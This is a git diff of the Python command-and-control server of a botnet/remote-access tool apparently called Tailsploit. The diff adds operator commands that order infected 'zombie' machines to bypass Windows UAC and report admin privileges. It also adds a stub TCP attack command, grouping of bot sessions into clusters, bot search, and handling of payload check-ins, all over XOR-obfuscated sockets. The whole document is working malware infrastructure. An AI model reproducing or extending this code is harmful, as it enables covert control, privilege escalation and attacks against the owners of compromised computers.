@@ -13,14 +13,11 @@ import datetime
 import ctypes
 import folium
 import select
+import platform
+import argparse
 
-# Get the absolute path of the directory containing the script
 script_dir = os.path.dirname(os.path.abspath(__file__))
-
-# Get the absolute path of the root directory of the project
 project_root = os.path.abspath(os.path.join(script_dir, os.pardir, os.pardir))
-
-# Add the root directory of your project to sys.path
 sys.path.insert(0, project_root)
 
 from lib.authentication.hashkey import GenerateHashkeyRequest
@@ -55,7 +52,7 @@ def StaticMethodCommandHandler(command_string, min_rank, is_available=True, reve
                 admin_rank = PERMISSION_HIERARCHY.get(admin_permission, 0)
 
             if admin_rank < min_rank:
-                permission_denied_response = f"[{Fore.RED}-{Style.RESET_ALL}] Permission denied. You do not have sufficient permission to execute this command."
+                permission_denied_response = f"[{Fore.RED}!{Style.RESET_ALL}] Permission denied. You do not have sufficient permission to execute this command."
                 permission_denied_response_xored = self.handleXOREncryption(permission_denied_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(permission_denied_response_xored)
                 return
@@ -77,7 +74,7 @@ def StaticMethodCommandHandler(command_string, min_rank, is_available=True, reve
                         command_func(self, admin_socket, admin_username, handleAdminShellCommands, *args)
 
             else:
-                unavailable_command_response = f"[{Fore.RED}-{Style.RESET_ALL}] '{command_string}' command is not available right now."
+                unavailable_command_response = f"[{Fore.RED}!{Style.RESET_ALL}] '{command_string}' command is not available right now."
                 unavailable_command_response_xored = self.handleXOREncryption(unavailable_command_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(unavailable_command_response_xored)
         
@@ -96,6 +93,7 @@ class ServerShell:
         self.TailsploitCommandHandler = {}
         self.SESSION_PERMISSION = ""
         self.TAILSPLOIT_THREAD_LOCK_ZOMBIES = threading.Lock()
+        self.CLUSTERS_SESSION = {}
         self.TailsploitServerConfigurationJSON()
 
     def TailsploitServerConfigurationJSON(self):
@@ -124,7 +122,7 @@ class ServerShell:
         key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
         return bytes([byte ^ key_byte for byte, key_byte in zip(content_data, key_traffic)])
 
-    def is_mac_whitelisted(self, key):
+    def TailsploitTokenHandler(self, key):
         with open('../../lib/authentication/hash-token.json', 'r') as key_file:
             self.TOKEN_AUTH = json.load(key_file)
 
@@ -139,6 +137,98 @@ class ServerShell:
                 else:
                     return "--FLAG_TOKEN_REVOKED"
         return "--FLAG_TOKEN_NOT_VALID"
+
+
+    #-------------------- ATTACK METHOD ----------------------#
+
+    @StaticMethodCommandHandler("attacktcp", is_available=True, reverse_shell_flag=False, min_rank=2)
+    def TailsploitTCPAttack(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        print(f"{Back.RED} ! {Style.RESET_ALL} Administrator \x1B[4m{admin_username}\x1B[0m Started an {Fore.RED}attack{Style.RESET_ALL} on → {Fore.YELLOW}0.0.0.0:5050{Style.RESET_ALL}")
+
+
+
+    #-------------------- CLUSTERS METHOD ----------------------#
+
+    @StaticMethodCommandHandler("create_cluster", is_available=True, min_rank=2, reverse_shell_flag=False)
+    def TailsploitCreateCluster(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if len(args) < 4 or args[0] != "-n" or args[2] != "-s":
+            usage_message = "Usage: create_group -n <group_name> -s <session_ips:session_ports>"
+            usage_message_xor = self.handleXOREncryption(usage_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(usage_message_xor)
+            return
+
+        group_name = args[1]
+        session_ips = args[3:]
+
+        if group_name not in self.CLUSTERS_SESSION:
+            valid_sessions = []
+
+            for session_address in session_ips:
+                try:
+                    session_ip, session_port = session_address.split(":")
+                    session_tuple = (session_ip, int(session_port))
+
+                    if session_tuple in self.TAILSPLOIT_ZOMBIES:
+                        valid_sessions.append(session_tuple)
+                    else:
+                        error_message = f"{Fore.RED}[*]{Style.RESET_ALL} Session {Fore.RED}{session_address}{Style.RESET_ALL} is not connected."
+                        error_message_xor = self.handleXOREncryption(error_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                        admin_socket.send(error_message_xor)
+                        return
+                except ValueError:
+                    error_message = f"{Fore.RED}[-]{Style.RESET_ALL} Invalid session address: {Fore.RED}{session_address}{Style.RESET_ALL}. Use the format <IP:PORT>."
+                    error_message_xor = self.handleXOREncryption(error_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(error_message_xor)
+                    return
+
+            if valid_sessions:
+                self.CLUSTERS_SESSION[group_name] = valid_sessions
+
+                cluster_created = f"{Fore.GREEN}[*]{Style.RESET_ALL} Cluster '{Fore.GREEN}{group_name}{Style.RESET_ALL}' has been created with {len(valid_sessions)} active sessions."
+                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} New Cluster '{Fore.GREEN}{group_name}{Style.RESET_ALL}' With {len(valid_sessions)} Active Sessions Has Been Created By \x1B[4m{admin_username}\x1B[0m")
+                cluster_created_xor = self.handleXOREncryption(cluster_created.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                admin_socket.send(cluster_created_xor)
+            else:
+                clu = "None of the provided sessions are connected."
+                clu_xor = self.handleXOREncryption(clu.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                admin_socket.send(clu_xor)
+        else:
+            cluster_exists = f"{Fore.RED}[-]{Style.RESET_ALL} Cluster '{Fore.RED}{group_name}{Style.RESET_ALL}' already exists. Please choose a diffrent cluster name. (type 'cluster' for more informations)"
+            cluster_exists_xor = self.handleXOREncryption(cluster_exists.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(cluster_exists_xor)
+
+    @StaticMethodCommandHandler("cluster", is_available=True, min_rank=2, reverse_shell_flag=False)
+    def TailsploitViewCluster(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if not self.CLUSTERS_SESSION:
+            ClusterEmpty = f"{Fore.YELLOW}[*]{Style.RESET_ALL} No clusters are created yet. ('create_cluster' for more informations)"
+            ClusterEmtpyXOR = self.handleXOREncryption(ClusterEmpty.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(ClusterEmtpyXOR)
+        else:
+            total_clusters = len(self.CLUSTERS_SESSION)
+            cluster_info = "\n\n".join([f"Cluster Name: {Fore.GREEN}{name}{Style.RESET_ALL}\nCluster Sessions IP:PORTs: {' | '.join(f'{Fore.GREEN}{ip}:{port}{Style.RESET_ALL}' for ip, port in ips)}\nActive Sessions: {Fore.GREEN}{len(ips)}{Style.RESET_ALL}" for name, ips in self.CLUSTERS_SESSION.items()])
+            cluster_info = f"{Fore.GREEN}[*]{Style.RESET_ALL} Total Clusters: {total_clusters}\n\n{cluster_info}"
+            cluster_info_xor = self.handleXOREncryption(cluster_info.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(cluster_info_xor)
+
+    @StaticMethodCommandHandler("delete_cluster", is_available=True, min_rank=2, reverse_shell_flag=False)
+    def TailsploitDeleteCluster(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if len(args) != 2 or args[0] != "-n":
+            usage_message = "Usage: delete_cluster -n <cluster_name>"
+            usage_message_xor = self.handleXOREncryption(usage_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(usage_message_xor)
+            return
+
+        cluster_name = args[1]
+
+        if cluster_name in self.CLUSTERS_SESSION:
+            del self.CLUSTERS_SESSION[cluster_name]
+            ClusterDeleted = f"{Fore.GREEN}[*]{Style.RESET_ALL} Cluster '{Fore.GREEN}{cluster_name}{Style.RESET_ALL}' has been deleted."
+            ClusterDeletedXOR = self.handleXOREncryption(ClusterDeleted.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(ClusterDeletedXOR)
+        else:
+            ClusterNotFound = f"{Fore.RED}[-]{Style.RESET_ALL} Cluster '{Fore.RED}{cluster_name}{Style.RESET_ALL}' does not exist."
+            ClusterNotFoundXOR = self.handleXOREncryption(ClusterNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(ClusterNotFoundXOR)
 
     @StaticMethodCommandHandler("task", is_available=True, reverse_shell_flag=False, min_rank=1)
     def handleViewThreadCommand(self, admin_socket, handleAdminShellCommands, *args):
@@ -227,7 +317,7 @@ class ServerShell:
             HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(HandleExceptXOR)
 
-    @StaticMethodCommandHandler("map", is_available=True, min_rank=1, reverse_shell_flag=False)
+    @StaticMethodCommandHandler("map", is_available=False, min_rank=1, reverse_shell_flag=False)
     def TailsploitMapLayers(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         print("[*] Generating tailsploit data map layers...")
         ConnListData = f"--FLAG_TAILSPLOIT_CONN_CLIENT_MAP:{[client_addr[0] for client_addr in self.TAILSPLOIT_ZOMBIES.keys()]}"
@@ -235,6 +325,54 @@ class ServerShell:
         admin_socket.send(ConnListDataXOR)
         print("[*] Done, data has been save in ../../tmp/tailsploit-bot-ipmap-layer-html")
 
+    @StaticMethodCommandHandler("bypassuac", is_available=True, min_rank=2, reverse_shell_flag=True)
+    def TailsploitBypassUAC(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
+            target_ip, target_port = args[1].split(":")
+            target_client_addr = (target_ip, int(target_port))
+            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
+            if target_socket:
+                thread_target = "BYPASS_UAC"
+                try:
+                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    target_socket.send(TargetXOR)
+                except Exception as e:
+                    ErrorPing = f"[-] Error, user may be disconnected"
+                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(ErrorPingXOR)
+            else:
+                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
+                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                admin_socket.send(UserDisconnectedXOR)
+        else:
+            HandleExcept = f"  : {args[0]}"
+            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(HandleExceptXOR)
+
+    @StaticMethodCommandHandler("isadmin", is_available=True, min_rank=2, reverse_shell_flag=True)
+    def TailsploitIsAdminPrivilege(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
+            target_ip, target_port = args[1].split(":")
+            target_client_addr = (target_ip, int(target_port))
+            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
+            if target_socket:
+                thread_target = "IS_ADMIN"
+                try:
+                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    target_socket.send(TargetXOR)
+                except Exception as e:
+                    ErrorPing = f"[-] Error, user may be disconnected"
+                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(ErrorPingXOR)
+            else:
+                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
+                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                admin_socket.send(UserDisconnectedXOR)
+        else:
+            HandleExcept = f"  : {args[0]}"
+            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(HandleExceptXOR)
+    
     @StaticMethodCommandHandler("stoplisten", is_available=True, min_rank=2, reverse_shell_flag=True)
     def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
@@ -283,7 +421,7 @@ class ServerShell:
             WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(WarningSessionXOR)
 
-    def handle_admin(self, admin_socket, admin_addr, admin_username):
+    def TailsploitPrivilegeSessionHandler(self, admin_socket, admin_addr, admin_username):
         while True:
             try:
                 defaultXOR = admin_socket.recv(4096)
@@ -327,6 +465,27 @@ class ServerShell:
                     SetCustomMethod = "killsession"
                     CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                     CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("isadmin"):
+                    SetCustomMethod = "isadmin"
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("bypassuac"):
+                    SetCustomMethod = "bypassuac"
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("search"):
+                    SetCustomMethod = "search"
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("create_cluster"):
+                    SetCustomMethod = "create_cluster"
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("delete_cluster"):
+                    SetCustomMethod = "delete_cluster"
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+
                 else:
                     if CommandFunction:
                         # If the command exists, call the associated method and pass admin_socket explicitly
@@ -351,38 +510,48 @@ class ServerShell:
                 self.admin_socket = None
                 break
 
-    @StaticMethodCommandHandler("zombies", is_available=True, min_rank=1, reverse_shell_flag=False)
-    def handleZombiesListCommand(self, admin_socket, *args):
-
-        def visible_length(text):
-            ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-            return len(ansi_escape.sub('', text))
-
+    @StaticMethodCommandHandler("sessions", is_available=True, min_rank=1, reverse_shell_flag=False)
+    def handleZombiesListCommand(self, admin_socket, handleAdminShellCommands, *args):
         alive_bots = len(self.TAILSPLOIT_ZOMBIES)
         dead_bots = len(self.DISCONNECTED_ZOMBIES)
         total_bots = alive_bots + dead_bots
 
-        line_width = visible_length("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
-
         alive_dead_line = f"Alive Bots: {Fore.RED}{alive_bots}{Style.RESET_ALL} ┃ Dead Bots: {Fore.RED}{dead_bots}{Style.RESET_ALL} ┃ Total Bots: {Fore.RED}{total_bots}{Style.RESET_ALL}"
-        centered_line = alive_dead_line.center(line_width)
 
-        formatZombiesList = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃   ID   ┃   Desktop Name   ┃   IP Address   ┃   Port   ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-
-    {centered_line}\n\n"""
+        formatZombiesList = f"""
+CID        Desktop Name        Bind Address           Operating System        Protocol        Status (+/-) 
+======     ================    ===================    ====================    ============    ============
+\n"""
 
         client_info_list = []
         no_client_info = []
         for i, (client_addr, client_socket) in enumerate(self.TAILSPLOIT_ZOMBIES.items(), start=1):
-            ip_address, port = client_addr
-            desktop_name = "Malcolm"
+            system_info = platform.system()
+            if system_info == "Windows":
+                architecture = platform.architecture()
+                formatted_arch = f"{system_info}/{architecture[0]}"
+            else:
+                machine = platform.machine()
+                formatted_arch = f"{system_info}/{machine}"
 
-            client_info = f"┃ {Fore.BLUE}{i:^5}{Style.RESET_ALL} ┃ {desktop_name[:17]:^17} ┃ {ip_address:^15} ┃ {port:^7} ┃\n"
+
+            ip_address, port = client_addr
+            port = str(port)
+            desktop_name = "DESKTOP-WNQ91AQ"
+            protocol = "TCP"
+            formatted_ip = f"{ip_address}:{port}"
+
+            def format_column(value, max_width):
+                if len(value) > max_width:
+                    return f"{value[:max_width - 3]}..."
+                else:
+                    return value
+
+            
+            client_info = f" {i:<5}    {format_column(desktop_name, 17):17}    {format_column(formatted_ip, 21):21}  {format_column(formatted_arch, 20):20}    {format_column(protocol, 3):3}             {Fore.GREEN}[ONLINE]{Style.RESET_ALL}"
             client_info_list.append(client_info)
 
-        NONE_AVAILABLE_BOTS = "         There is no bot currently connected."
+        NONE_AVAILABLE_BOTS = "[*] Any Tailsploit connected session detected, check (Generate a Payload)."
         no_client_info.append(NONE_AVAILABLE_BOTS)
 
         if len(self.TAILSPLOIT_ZOMBIES) <= 0:
@@ -392,6 +561,46 @@ class ServerShell:
         
         BotListXOR = self.handleXOREncryption(NewFormatZombies.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(BotListXOR)
+
+    @StaticMethodCommandHandler("search", is_available=True, min_rank=1, reverse_shell_flag=False)
+    def TailsploitSearchingQuery(self, admin_socket, admin_username, handelAdminShellCommands, *args):
+        if len(args) < 1:
+            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'search <QUERY>' (Desktop Name / IP Address)."
+            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(InvalidFormatXOR)
+            return
+        SearchQuery = f"{args[0]}"
+        try:
+            matching_clients = []
+            for i, (client_addr, client_socket) in enumerate(self.TAILSPLOIT_ZOMBIES.items(), start=1):
+                ip_address, port = client_addr
+                desktop_name = "Malcolm" 
+
+                if SearchQuery.lower() == desktop_name.lower():
+                    formatted_desktop_name = f"{Back.YELLOW}{desktop_name}{Style.RESET_ALL}"
+                    client_info = f"┃ {Fore.BLUE}{i:^5}{Style.RESET_ALL} ┃ {formatted_desktop_name[:17]:^17} ┃ {ip_address:^15} ┃ {port:^7} ┃\n"
+                    matching_clients.append(client_info)
+                elif SearchQuery == ip_address:
+                    formatted_ip_address = f"{Back.YELLOW}{ip_address}{Style.RESET_ALL}"
+                    client_info = f"┃ {Fore.BLUE}{i:^5}{Style.RESET_ALL} ┃ {desktop_name[:17]:^17} ┃ {formatted_ip_address:^15} ┃ {port:^7} ┃\n"
+                    matching_clients.append(client_info)
+
+            if not matching_clients:
+                NegativeSearchQuery = f"{Fore.RED}[*]{Style.RESET_ALL} (Search Index) No clients matching your search query."
+                NegativeSearchQueryXOR = self.handleXOREncryption(NegativeSearchQuery.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                self.admin_socket.send(NegativeSearchQueryXOR)
+            else:
+                matching_clients_str = ''.join(matching_clients)
+                formatted_query_clients = f"""{Fore.GREEN}[*]{Style.RESET_ALL} Search result for clients/bots index: Matching IP/Name - {len(matching_clients)} Client(s) Found.
+
+{matching_clients_str}
+"""
+                PositiveSearchQueryXOR = self.handleXOREncryption(formatted_query_clients.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                self.admin_socket.send(PositiveSearchQueryXOR)
+        except: 
+            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'search <QUERY>' (Desktop Name / IP Address)."
+            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(InvalidFormatXOR)
 
     @StaticMethodCommandHandler("ping", is_available=True, min_rank=2, reverse_shell_flag=True)
     def PingReverseShellTarget(self, admin_socket, admin_username, handleAdminShellCommands, *args):
@@ -403,11 +612,9 @@ class ServerShell:
                 thread_target = "REVERSE_SHELL_THREAD=ISALIVE?"
                 try:
                     TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
-                    print("Sending to target...")
                     target_socket.send(TargetXOR)
-                    print("Sended !")
                 except Exception as e:
-                    ErrorPing = f"[-] Error, user may be disconnected"
+                    ErrorPing = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                     ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                     admin_socket.send(ErrorPingXOR)
             else:
@@ -506,10 +713,9 @@ For more information, see the JSON file located at:
             SendTokenToAdmin = self.handleXOREncryption(CreatedFormatToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(SendTokenToAdmin)
         except Exception as e:
-            print(e)
-            print("[*] An error occured while generating the token.")
+            print(f"{Fore.RED}[!]{Style.RESET_ALL} An error occured while generating the token. {e}")
 
-    @StaticMethodCommandHandler("adminlist", is_available=True, min_rank=1, reverse_shell_flag=False)
+    @StaticMethodCommandHandler("adminsession", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleAdminListCommand(self, admin_socket, *args):
         admin_list = []
         for username, admin_info in self.TAILSPLOIT_ADMINS_SESSION.items():
@@ -518,7 +724,7 @@ For more information, see the JSON file located at:
             permission = admin_info["permission"]
             uptime = time.time() - join_time
             uptime_str = self.format_uptime(uptime)
-            admin_list.append(f"{username} - {Fore.YELLOW}{addr[0]}{Style.RESET_ALL}:{Fore.YELLOW}{addr[1]}{Style.RESET_ALL} ~ {permission} (Uptime: {Fore.RED}{uptime_str}{Style.RESET_ALL})")
+            admin_list.append(f"{username} - {Fore.YELLOW}{addr[0]}{Style.RESET_ALL}:{Fore.YELLOW}{addr[1]}{Style.RESET_ALL} ~ {permission} (Uptime: {Fore.GREEN}{uptime_str}{Style.RESET_ALL})")
 
         num_admins = len(admin_list)
         response = f"[{Fore.GREEN}*{Style.RESET_ALL}] {num_admins} Administrator(s) are/is currently connected\n"
@@ -529,7 +735,7 @@ For more information, see the JSON file located at:
         OnlineAdministratorsXOR = self.handleXOREncryption(response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(OnlineAdministratorsXOR)
 
-    @StaticMethodCommandHandler("session", is_available=True, min_rank=1, reverse_shell_flag=False)
+    @StaticMethodCommandHandler("mysession", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleAdminInfoCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
             admin_info = self.TAILSPLOIT_ADMINS_SESSION.get(admin_username)
             if admin_info:
@@ -550,9 +756,10 @@ For more information, see the JSON file located at:
     def handleServerAuthorizationDetails(self, admin_socket, admin_username, handleAmdminShellCommands, *args):
         AuthorizationStatus = f"""[{Fore.GREEN}*{Style.RESET_ALL}] Server Authorization Details / Status:
                 
-Server Encryption Communication : {Fore.GREEN}Enabled{Style.RESET_ALL}
+Server Encrypted Communication : {Fore.GREEN}Enabled{Style.RESET_ALL}
 Server Authentication Token : {Fore.GREEN}Enabled{Style.RESET_ALL}
-Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED}{ "Enabled" if self.TSF_SESSION_TIMEOUT else "Disabled"}{Style.RESET_ALL}"""
+Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED}{ "Enabled" if self.TSF_SESSION_TIMEOUT else "Disabled"}{Style.RESET_ALL}
+Server MFA (Multi-Factor Authentication) : {Fore.GREEN if self.TSF_MFA_SESSION_STATE else Fore.RED}{ "Enabled" if self.TSF_MFA_SESSION_STATE else "Disabled"}{Style.RESET_ALL}"""
         AuthorizationStatusXOR = self.handleXOREncryption(AuthorizationStatus.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(AuthorizationStatusXOR)
 
@@ -573,7 +780,7 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
 
         return uptime_str
     
-    def handle_client(self, client_socket, client_addr):
+    def TailsploitBasicSessionHandler(self, client_socket, client_addr):
             try:
                 AUTHENTICATION_KEY_XOR = client_socket.recv(4096)
                 AUTHENTICATION_KEY = self.handleXOREncryption(AUTHENTICATION_KEY_XOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
@@ -581,14 +788,24 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
                 client_socket.close()
                 AUTHENTICATION_KEY = ""
             
-            if AUTHENTICATION_KEY == "REGULAR_CLIENT_FLAGS":
-                if self.TAILSPLOIT_LOG_WEBOOK:
-                    TailsploitIncomingConnectionRegularClient(client_addr)
-                print("Regular client without a MAC address")
+            if "--FLAG:CLIENT_PAYLOAD" in AUTHENTICATION_KEY:
+                key_parts = AUTHENTICATION_KEY.split('::')
+                if key_parts[0] == "--FLAG:CLIENT_PAYLOAD":
+                    if len(key_parts) == 3:
+                        _, bypass_uac, desktop_name = key_parts
+                        print(f"BypassUAC: {bypass_uac}")
+                        print(f"DesktopName: {desktop_name}")
+                    else:
+                        print("Invalid authentication key format: Incorrect number of parts")
+                else:
+                    print("Invalid authentication key format: Missing '--FLAG:CLIENT_PAYLOAD'")
+
+                #if self.d:
+                    #TailsploitIncomingConnectionRegularClient(client_addr)
                 self.TAILSPLOIT_ZOMBIES[client_addr] = client_socket
                 return
 
-            OnAuthTokenResult = self.is_mac_whitelisted(AUTHENTICATION_KEY)
+            OnAuthTokenResult = self.TailsploitTokenHandler(AUTHENTICATION_KEY)
             print(f"{Fore.YELLOW}[~]{Style.RESET_ALL} An Administrator Attempt To Connect ({Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
             if len(self.TAILSPLOIT_ADMINS_SESSION) >= self.TSF_SERVER_MAX_ADMINS_CONN:
                 print("Max Admin Reached")
@@ -675,11 +892,6 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
                     print(f"No username received from admin {client_addr}")
                     AdminUsername = ""
 
-                # Store the admin's information along with the time they joined 
-
-                # ISSUE : Might have a race condition when 2 admins or more connect at the exact same time (we talk about milisecond) because we not running this function
-                # in a separate thread, that mean all the local function can be overwritted by the other admin, it can cause some data corruption but its not a high frequency issue, if anyone wants to do a pull request to fix that feel free :)
-                # By the way we are not running this function in a separate thread because if we have 500 clients + few admins, the server will need to handle around 500+ threads so not optimized at all.
                 admin_info = {"socket": client_socket, "addr": client_addr, "join_time": time.time(), "token": AUTHENTICATION_KEY, "permission": self.SESSION_PERMISSION}
                 print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Starting Administrator Session... Connection Initiated - {AdminUsername} ({Fore.GREEN}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
 
@@ -687,7 +899,7 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
                 if self.TAILSPLOIT_LOG_WEBOOK:
                     TailsploitIncomingConnectionAdminClientAuthorized(client_addr)
 
-                admin_thread = threading.Thread(target=self.handle_admin, args=(client_socket, client_addr, AdminUsername), name=f"Tailsploit Admin Session Data Handler - @{AdminUsername}")
+                admin_thread = threading.Thread(target=self.TailsploitPrivilegeSessionHandler, args=(client_socket, client_addr, AdminUsername), name=f"Tailsploit Admin Session Data Handler - @{AdminUsername}")
                 admin_thread.start()
 
                 if self.TSF_SESSION_TIMEOUT:    
@@ -745,7 +957,7 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
         while True:
             try:
                 if not self.TAILSPLOIT_ZOMBIES:
-                    continue  # No clients, continue to the next iteration
+                    continue
 
                 readable, _, _ = select.select(list(self.TAILSPLOIT_ZOMBIES.values()), [], [], 1)
                 
@@ -760,7 +972,7 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
                         self.HandleClientDisconnect(client_socket)
                             
             except Exception as e:
-                print("ERROR: ", e)
+                pass
 
     def IncomingDataSocket(self, client_socket, data):
         if data.startswith(b"AUD:"):
@@ -803,16 +1015,43 @@ Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED
             # String doesn't start with the flag, handle this case accordingly
             print("String doesn't start with the flag.")
 
-
-
     def process_data(self, client_socket, decoded_data):
         if decoded_data == "REVERSE_SHELL_THREAD=ISALIVE?TRUE":
             try:
-                isAlive = f"[{Fore.GREEN}*{Style.RESET_ALL}] Reverse Shell target is alive"
+                isAlive = f"{Fore.GREEN}[*]{Style.RESET_ALL} Reverse Shell (TCP) - Target is alive"
                 isAliveXOR = self.handleXOREncryption(isAlive.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 self.admin_socket.send(isAliveXOR)
             except Exception as e:
                 print(e)
+        elif decoded_data == "--FLAG:UAP=TRUE":
+            try:
+                UserUAP = f"{Fore.GREEN}[*]{Style.RESET_ALL} This session has administrative privileges. (UAC Bypass {Fore.GREEN}(+){Style.RESET_ALL})"
